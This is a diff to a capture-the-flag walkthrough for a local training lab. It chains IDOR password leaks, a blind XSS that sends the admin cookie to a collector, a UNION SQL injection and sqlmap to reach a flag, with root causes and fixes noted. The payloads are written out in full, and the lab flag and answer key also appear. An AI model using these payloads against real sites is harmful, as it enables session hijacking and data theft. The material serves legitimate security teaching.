@@ -14,13 +14,24 @@ RECON ─► REGISTER ─► IDOR ×2 ─► LOGIN as support ─► BLIND XSS �
                       password)                        cookie)       search)
 ```
 
+**Vhost layout.** The customer site (home, register, login, account, tickets,
+`/api/users*`) is on the main host (localhost / `app.deaddrop.local`). The
+**staff tools — `/support`, `/support/escalate`, `/admin` — exist ONLY on
+`internal.deaddrop.local`**; anywhere else they 404 (and `/admin` on the main
+host returns a troll that hints "not on this host"). The internal root is a
+**staff portal login**. To drive it in a browser, add a hosts entry:
+`127.0.0.1  internal.deaddrop.local` (the IDOR/API recon can be done by IP/Host
+header with no hosts entry). Staff log in on the internal vhost, so the session
+cookie is scoped to the right host.
+
 Each link gates the next:
 
-- **`/support`** needs role `support` → you must log in with the **stolen support
-  password** (from the IDOR).
-- **`/admin`** needs role `admin` → the only admin session is the bot's, so you
-  must **steal its cookie via XSS**. Admin & founder passwords are **redacted in
-  the API**, so you *cannot* just log in as admin — no shortcut past the XSS.
+- **`/support`** (internal) needs role `support` → log in on the internal portal
+  with the **stolen support password** (from the IDOR). Support sees **every
+  customer's tickets** (that's the desk's job) plus the escalate form.
+- **`/admin`** (internal) needs role `admin` → the only admin session is the
+  bot's, so you must **steal its cookie via XSS**. Admin & founder passwords are
+  **redacted in the API**, so you *cannot* just log in as admin — no shortcut.
 - The **flag is only in the `vault` table**, which no normal query reads → it
   requires the **UNION injection** in the admin search, which needs the admin
   session.
@@ -64,8 +75,9 @@ View it:
 ```bash
 curl -H "Host: internal.deaddrop.local" http://localhost:5000/
 ```
-It lists the real endpoints: `/ticket?id=<n>`, `/api/users/<id>`, `/admin`.
-Reaching any `/api/*` or the vhost sets `recon`.
+Internal is the **DeadDrop staff portal** (a staff login, and once you're in,
+links to the support console and admin panel). Finding it tells you staff creds
+are the next target. Reaching any `/api/*` or the vhost sets `recon`.
 
 > HUD note: the vhost is a different origin, so vhost recon done purely with
 > tools won't tick the browser's counter — opening `/api/users` on localhost does.
@@ -84,13 +96,20 @@ Reaching any `/api/*` or the vhost sets `recon`.
    ```
    http://localhost:5000/ticket?id=1      (alice's — not yours)
    ```
-   Ticket **#1** carries a support reply signed *"— Amira, Customer Support
-   (account #2)"* → the support agent is **account #2**. Reading any non-owned
+   Ticket **#1** carries a support reply from *Amira*: she's a **staff login,
+   account #2**, and mentions staff accounts live in a "user directory" (the
+   `/api/users` service they saw in recon) → points at IDOR #2. The exact
+   endpoint is intentionally not spelled out in the reply. Reading any non-owned
    ticket sets `idor`.
 
-3. **IDOR #2 — REST API** `/api/users/:id`. The list endpoint (`/api/users`) is
-   recon; the **item** endpoint returns the full record **including the password**,
-   with no ownership check:
+3. **IDOR #2 — REST API** `/api/users/:id`. **How students find the endpoint:**
+   the **My account** page (`/account`) loads its profile card client-side with
+   `fetch('/api/users/<their-own-id>')`. Anyone watching DevTools → Network (or
+   Burp) sees that request, notices the id in the URL, and the own-account JSON
+   even echoes their own `password` — so the natural next thought is "change the
+   id." The list endpoint (`/api/users`) is recon; the **item** endpoint returns
+   the full record **including the password**, with no ownership check. Fetching
+   your *own* id does not set `idor`; any other id does:
    ```bash
    curl -b "sid=<your session>" http://localhost:5000/api/users/2
    # -> {"id":2,"handle":"customer_support","role":"support",...,"password":"Amira!Cairo#2024"}
@@ -110,11 +129,13 @@ be in a response at all. Sensitive-data exposure stacked on top of IDOR.)
 
 ## Link 3 — Log in as support → Blind XSS → steal admin cookie  (marks `xss`)
 
-1. Log in at `/login` as `customer_support` / `Amira!Cairo#2024` → `/support`.
-2. Support can **escalate a case to the admin**. The admin reviews the queue
-   immediately; the queue renders the escalation **raw** → blind XSS in the
-   admin's session. Submit (any of these) at `/support`, callback to the in-app
-   `/collect` (or your own `python3 -m http.server`):
+1. On **`internal.deaddrop.local`** (hosts entry needed), log in at `/login` as
+   `customer_support` / `Amira!Cairo#2024` → the support console. It lists every
+   customer's tickets and an **escalate to admin** form.
+2. Escalating sends a note to the admin, who reviews the queue immediately; the
+   queue renders the escalation **raw** → blind XSS in the admin's session.
+   Submit (any of these) in the escalate form, callback to the in-app `/collect`
+   (reachable on any host) or your own `python3 -m http.server`:
    ```html
    <img src=x onerror="new Image().src='http://localhost:5000/collect?c='+document.cookie">
    ```
@@ -131,13 +152,14 @@ GETs it. So **any URL + `document.cookie` = success**. No real headless browser.
 `ADMIN_SID` is random per boot (unguessable → must be stolen). `location` is
 also supported (sends the admin URL instead).
 
-**Use it:** Intercept's **"become them → admin panel"** button sets the `sid`
-cookie for you; or set it by hand in DevTools / curl:
+**Use it:** open `/intercept` **on internal.deaddrop.local** and hit
+**"become them → admin panel"** (it sets `sid` for the internal host, then goes
+to `/admin`); or set it by hand in DevTools / curl:
 ```bash
-curl -b "sid=adm_<stolen>" http://localhost:5000/admin
+curl -b "sid=adm_<stolen>" -H "Host: internal.deaddrop.local" http://localhost:5000/admin
 ```
 Only `support`/`admin` can escalate, so a plain customer can't reach this step —
-it's gated behind the IDOR.
+it's gated behind the IDOR. (`/admin` 404-trolls on the main host.)
 
 **Root cause:** escalation rendered unescaped in the admin queue (blind: the
 attacker's own confirmation is clean). Fix = contextual output encoding + CSP +
@@ -158,16 +180,16 @@ Four columns → UNION with the `vault` table (also 4 cols). The flag is only in
 zzz' ORDER BY 4--           (ok)   /   zzz' ORDER BY 5--   (error)   -> 4 cols
 zzz' UNION SELECT id, label, secret, note FROM vault-- 
 ```
-URL-encoded:
+URL-encoded (browser, on the internal vhost):
 ```
-http://localhost:5000/admin?q=zzz%27%20UNION%20SELECT%20id,label,secret,note%20FROM%20vault--%20
+http://internal.deaddrop.local:5000/admin?q=zzz%27%20UNION%20SELECT%20id,label,secret,note%20FROM%20vault--%20
 ```
 The smuggled row renders as a "member" card; `secret` = `FLAG{ch41n3d_rec0n_id0r_xss_sqli}`.
 That sets `sqli`. Submit it at `/flag` to win and sign the Wall of Fame.
 
-sqlmap (with the stolen cookie):
+sqlmap (with the stolen cookie, against the internal vhost):
 ```bash
-sqlmap -u "http://localhost:5000/admin?q=a" --cookie="sid=adm_<stolen>" -p q --batch --dump -T vault
+sqlmap -u "http://internal.deaddrop.local:5000/admin?q=a" --cookie="sid=adm_<stolen>" -p q --batch --dump -T vault
 ```
 
 **Root cause:** string-concatenated query. Fix = parameterized query.
